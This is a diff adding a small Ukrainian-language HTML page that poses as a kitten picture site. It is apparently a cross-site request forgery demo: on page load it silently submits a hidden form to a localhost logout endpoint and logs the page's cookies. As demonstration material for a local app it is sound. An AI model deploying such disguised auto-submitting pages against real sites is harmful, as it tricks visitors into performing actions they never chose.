@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <title>Сайт з котиками</title>
+</head>
+<body onload="submitForm()">
+<h1>Подивіться на це миле кошеня!</h1>
+<img src="https://images.app.goo.gl/D4gFjnmxFXpdrAYLA" alt="Кошеня">
+
+<form action="http://localhost:8080/logout" method="post" style="display:none;">
+</form>
+
+<script>
+  function submitForm() {
+    // Виводимо cookie поточної сторінки (ймовірно, буде порожньо)
+    console.log("Cookie, доступні зі сторінки атаки:", document.cookie);
+    console.log("Надсилаємо прихований запит на /logout...");
+
+    // Надсилаємо форму
+    document.forms[0].submit();
+  }
+</script>
+</body>
+</html>
